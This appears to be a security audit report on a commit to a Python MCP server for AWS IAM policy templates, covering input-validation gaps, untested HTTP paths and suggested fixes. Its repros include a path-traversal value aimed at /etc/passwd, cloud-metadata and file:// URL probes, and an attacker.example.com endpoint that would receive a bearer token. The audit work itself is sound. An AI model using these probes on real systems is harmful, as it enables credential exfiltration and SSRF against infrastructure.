# Round 14 audit — Stage 1 of NL deprecation

Commit under review: `00c7c78` (`mcp(0.3.0): add list_templates+get_template+submit_policy; deprecate generate_iam_policy`).

Scope: `src/iam_jit/mcp_server.py`, `src/iam_jit/aws_managed_catalog.py`, `tests/test_mcp_template_tools.py`. Black-box probes against `python -m iam_jit.mcp_server` over stdio.

## Headline
9 findings: 0 CRIT, 0 HIGH, 4 MED, 5 LOW/INFO. Clean security posture — no credential leaks, no authorization bypass, no information disclosure beyond the public catalog, no SSRF beyond the inherent trust model of operator-set env vars. All input-validation gaps are server-internal misbehavior (raises, silent-empties, or pass-through) and would be caught/rejected by the iam-jit backend on submission. Test coverage of the HTTP submission branch is the most actionable gap.

## CRIT findings
None.

## HIGH findings
None.

## MED findings

### MED-14-01 list_templates raises AttributeError on non-string `service` / `query`
- File: `src/iam_jit/aws_managed_catalog.py:590` (service.lower()), `:600` (query.strip().lower())
- Issue: `_list_templates_for_mcp` passes the raw `args.get(...)` through without type-checking. If the agent sends `{"service": {"x":1}}` or `{"query": 42}`, `aws_managed_catalog.list_entries` calls `.lower()` / `.strip()` on the wrong type and raises `AttributeError`. The dispatch try/except in `_handle_request` catches it and returns JSON-RPC `-32603` ("internal error"), keeping the server alive.
- Repro (black-box, observed):
  ```
  → {"name":"list_templates","arguments":{"service":{"inject":1}}}
  ← error: {"code":-32603,"message":"internal error: 'dict' object has no attribute 'lower'"}
  → {"name":"list_templates","arguments":{"query":42}}
  ← error: {"code":-32603,"message":"internal error: 'int' object has no attribute 'strip'"}
  ```
- Impact: Wrong JSON-RPC error code (`-32603` internal vs `-32602` invalid params), agent gets a confusing error rather than a schema violation. Not a security issue — no leak, no crash of the server — but it's a polish gap that surfaces a Python error string to the agent and signals an unhandled path. The schema declares `service`/`query` as `string` but the server doesn't enforce.
- Fix: Add `isinstance(...,str)` guards in `_list_templates_for_mcp` mirroring the pattern already in `_get_template_for_mcp` (which correctly rejects non-strings for `name`). Or: validate against the published `inputSchema` centrally in `_handle_request` before dispatch.

### MED-14-02 submit_policy does not type-validate items in `accounts`
- File: `src/iam_jit/mcp_server.py:528-533, 555`
- Issue: Only the outer list is checked. `accounts` items can be `int`, `None`, `dict`, even nested arrays — all pass through into `list(accounts)` and end up in `would_submit.spec.accounts`. The published `inputSchema` says `items: {"type": "string"}` but the server doesn't enforce.
- Repro:
  ```py
  _submit_policy_for_mcp({
    "policy": {...}, "description": "x",
    "accounts": [123, None, {"evil":"object"}, "../../../etc/passwd"],
  })
  # → no error; accounts pass through verbatim
  ```
- Impact: When the backend IS configured, the iam-jit API would reject these (so no auth bypass possible — backend is the trust boundary). When the backend is NOT configured (the would-submit return path), an agent that piped the response into a downstream tool that trusted account-IDs without re-validation could be confused. Inconsistent with the rigor of `description` / `duration_hours` validation in the same function.
- Fix: After `if not isinstance(accounts, list) or not accounts:`, add `if not all(isinstance(a, str) and a.strip() for a in accounts): return {"error": "accounts items must be non-empty strings", ...}`. Optionally also regex-validate AWS-account-ID shape (12 digits) — this would catch typos for the would-submit path.

### MED-14-03 submit_policy does not type-validate `assume_principal_arn` or `ticket`
- File: `src/iam_jit/mcp_server.py:560-563`
- Issue: `args.get("assume_principal_arn")` and `args.get("ticket")` are inserted into the request body verbatim if truthy. A dict, list, or number passes through.
- Repro:
  ```py
  _submit_policy_for_mcp({
    "policy": {...}, "description": "x", "accounts": ["111111111111"],
    "assume_principal_arn": {"inject": "object"},
    "ticket": ["array", "inject"],
  })
  # → would_submit.spec.assume_principal_arn = {"inject":"object"}
  # → would_submit.spec.ticket = ["array","inject"]
  ```
- Impact: Same as MED-14-02 — backend would reject when configured. Audit-log-search tools that assume `ticket` is a string could misbehave.
- Fix: `if isinstance(args.get("assume_principal_arn"), str) and args["assume_principal_arn"].strip(): ...` (and same for `ticket`).

### MED-14-04 Test file does not exercise the HTTP submission branch at all
- File: `tests/test_mcp_template_tools.py` (entire file)
- Issue: `_submit_policy_for_mcp`'s configured-backend code path (`src/iam_jit/mcp_server.py:587-634`, ~50 LoC) — `httpx.Client(...).post(...)`, the connection-error branch, the `resp.status_code >= 400` branch, the JSON-parse fallback, the success-response branch — has **zero test coverage**. No `respx` / `httpx_mock` usage; no `IAM_JIT_URL` is ever set non-empty in tests.
- Impact: A regression in URL construction, header construction, error handling, or response parsing in the HTTP branch would not be caught by `tests/test_mcp_template_tools.py`. The path that actually leaks tokens (Authorization header construction) is precisely the untested one. The probe in this audit shows the path works today, but there is no regression net.
- Fix: Add (using existing `respx` dep already in pyproject):
  1. Success POST returns 200 → response includes `request_id`, `auto_approved`.
  2. Backend returns 400/401/403/500 → `submitted=False`, `error` contains HTTP status, response body truncated to 400 chars, token NOT in response anywhere.
  3. Backend connection failure (`httpx.ConnectError`) → handled gracefully.
  4. Backend returns non-JSON body → `body = {}` fallback fires, no crash.
  5. `IAM_JIT_URL` ends in `/` → trailing-slash strip works.

## LOW / INFO findings

### LOW-14-05 list_templates silently returns empty for unknown access_type / source values
- File: `src/iam_jit/aws_managed_catalog.py:587-598`
- Issue: `access_type="invalid-type"` returns `{"templates": [], "total": 0}` rather than an error. `source="random-string"` (any value other than `aws-managed`) hits the pre-launch early-return-empty. `source=""` (empty string) also returns empty because `source is not None and source != "aws-managed"` is True.
- Impact: Confusing UX for agents — they can't tell "no templates match" from "you sent garbage." Not a security issue.
- Fix: Either validate against the schema enums and return `error`, or change the empty-`source` branch to behave like `None` (no filter).

### LOW-14-06 SSRF via operator-controlled IAM_JIT_URL — bearer token sent to arbitrary host
- File: `src/iam_jit/mcp_server.py:565-596`
- Issue: `IAM_JIT_URL` is read from env without scheme/host validation. If a user / shell-rc / wrapper script sets `IAM_JIT_URL=http://attacker.example.com`, the next `submit_policy` call sends `Authorization: Bearer <IAM_JIT_TOKEN>` to the attacker. Same trust model as `aws-cli` reading `AWS_ENDPOINT_URL` or `kubectl` reading `KUBECONFIG`.
- Probe: `IAM_JIT_URL=file:///etc/passwd` → httpx raises `unsupported protocol`; token not exfiltrated. `IAM_JIT_URL=http://169.254.169.254` → real outbound HTTP POST is made, request body + Authorization header are sent. Token leak vector exists if attacker controls env.
- Impact: LOW because this is the inherent trust model for env-var credentials. The user/operator is expected to control their env. No way for an MCP agent or a peer process to influence the env after server start. Worth documenting.
- Fix: Optional — refuse non-`http(s)` schemes and refuse loopback/link-local addresses unless `IAM_JIT_ALLOW_INTERNAL=1` is set. Or: add a one-time stderr warning the first time `submit_policy` is invoked with a non-https URL.

### LOW-14-07 Deprecation block missing on error path of generate_iam_policy
- File: `src/iam_jit/mcp_server.py:640-644`
- Issue: When `task` is missing/empty, `_generate_for_mcp` returns `{"error": "...", "policy": None}` with no `deprecation` block. The two success paths (synthesis success + baseline fallback) both emit it.
- Impact: An agent that mistakenly calls `generate_iam_policy` with no `task` doesn't get the deprecation pointer toward `list_templates`/`get_template`/`submit_policy`. Low — the description on the tool already screams DEPRECATED, so the agent has been warned before the call.
- Fix: Add `"deprecation": _DEPRECATION_BLOCK` to the error-return dict at line 641-644.

### LOW-14-08 duration_hours accepts Python bool
- File: `src/iam_jit/mcp_server.py:534-539`
- Issue: `isinstance(True, int)` is `True` in Python (bool subclasses int), so `duration_hours=True` passes validation and is written to `would_submit.spec.duration_hours = True`. `False` would be caught by the `< 1` check.
- Impact: Pedantic — backend will likely accept `true` as `1`. JSON serializes it as `true` rather than `1`, which could confuse strict schema validators on the backend.
- Fix: `if isinstance(duration_hours, bool) or not isinstance(duration_hours, int) or ...`.

### INFO-14-09 Garbage policy shapes silently score as 1 in submit_policy
- File: `src/iam_jit/mcp_server.py:546-549` (delegates to `_score_for_mcp`)
- Issue: A `policy` like `{}` or `{"unrecognized": "shape"}` passes the `isinstance(policy, dict)` check and reaches `analyze_policy`, which returns `score=1` ("No statements in policy") and `recommended_action=OK_TO_PROCEED`. submit_policy then echoes the bogus policy back in `would_submit` with score=1.
- Impact: Pre-existing behavior (also in `_score_for_mcp` from prior commits — not introduced by Stage 1). Backend would reject on submission. Could mislead an agent that trusts the local score signal. INFO because the backend is the real validator and the scorer's "no statements" output is a true factor, not a lie.
- Fix: Optional shape check before scoring — require `Statement` to be a non-empty list with valid Effect/Action/Resource items. Out of scope for Stage 1; flag for Stage 2 when the deprecation cleanup touches this path.

## What's solid (positive findings)

1. **No credential leak in error paths.** Probed `IAM_JIT_TOKEN=test-token-secret-xyz` with `IAM_JIT_URL=http://127.0.0.1:1` (refused), `file:///etc/passwd` (unsupported scheme), `http://169.254.169.254` (no route). In every case the token does NOT appear anywhere in the JSON-RPC response. `httpx.ConnectError.__str__` and `httpx.RequestError.__str__` do not include the Authorization header.
2. **No information disclosure beyond the catalog.** `_entry_to_full_dict` returns only `{name, arn, source, summary, services, access_type, policy}`. No secret/internal fields exposed.
3. **get_template input validation is rigorous.** Rejects non-string names, rejects empty/whitespace-only names, strips whitespace before lookup, returns structured `{error, policy: null}` (not a raise).
4. **submit_policy core validation is rigorous.** `policy` (must be dict), `description` (must be non-empty string, stripped), `accounts` (must be non-empty list), `duration_hours` (must be int in [1, 720]), `access_type` (coerces invalid → `read-only` per `[[read-only-default]]`).
5. **Description truncation is correct at the boundary.** Tested lengths 1023/1024/1025/5000 — output is exactly `min(input, 1024)` chars. Truncation happens after `.strip()`, so whitespace doesn't inflate.
6. **Deprecation block fires on both legacy success paths.** `_generate_for_mcp` includes `deprecation` on the synthesis-success path (line 727) AND the baseline-fallback path (line 692). Empty-prompt error path is missing it (LOW-14-07).
7. **Legacy `generate_iam_policy` still works for back-compat.** All pre-existing tests pass; tools/list still includes it; dispatch still routes to `_generate_for_mcp`.
8. **MCP dispatch wiring is clean.** All three new tools added to the `tools/call` `if/elif` chain (lines 769-774). Unknown tools still return `-32601 method not found`. Server stays alive across all error paths (try/except in main loop at line 836).
9. **list_templates correctly suppresses policy bodies.** `_entry_to_summary_dict` excludes `policy` / `policy_shape`. Test `test_list_templates_no_inlined_policy_shapes` enforces it explicitly. Truncation cap of 50 entries (with `truncated: true` flag) protects against runaway responses if the catalog ever grows.
10. **Authorization bypass surface is correctly minimal.** submit_policy is a thin HTTP client; the backend enforces token-scope, account-scope, safety-mode, and auto-approval gates. No local override path exists in Stage 1.

## Tests passed (regression check)

- `tests/test_mcp_server.py` ………………… all pass (existing MCP server tests)
- `tests/test_mcp_score_policy.py` …………… all pass (score_iam_policy tool)
- `tests/test_mcp_read_only_default.py` …… all pass (read-only default convention)
- `tests/test_aws_managed_catalog.py` ……… all pass (catalog match_baseline / best_baseline)
- `tests/test_mcp_template_tools.py` ……… 27 new pass

Combined: **76 passed in 0.19s** (49 pre-existing + 27 new).

Full repo suite (excluding `tests/e2e`): 4291 passed, 96 failed in `tests/test_calibration_corpus.py`. The 96 failures are pre-existing on the parent commit (`00c7c78^` = `6a60629`) — verified by checking out parent and re-running. Calibration drift is unrelated to Stage 1 and out of scope.

## Stage-2 carry-forward checklist

When `_generate_for_mcp`'s baseline-fallback block + `match_baseline`/`best_baseline` are deleted in Stage 2:

- [ ] Make sure the deprecation block still fires on the (now sole) generate_iam_policy code path.
- [ ] Update `test_generate_iam_policy_baseline_fallback_also_has_deprecation` — the fallback path is gone; either delete the test or repurpose it.
- [ ] Address INFO-14-09 (garbage-policy scoring) if the policy-shape validation is touched in this stage.
- [ ] If `_generate_for_mcp` itself is removed in Stage 3, audit any callers in `cli.py` / `app.py` (the audit didn't check call sites — Stage 1 doesn't delete it so the question doesn't arise yet).

When the test file is touched in Stage 2:

- [ ] Add `respx`-based HTTP-branch tests (MED-14-04 fix) — these will continue to be valuable even after `_generate_for_mcp` is gone, since `submit_policy` is the persistent surface.
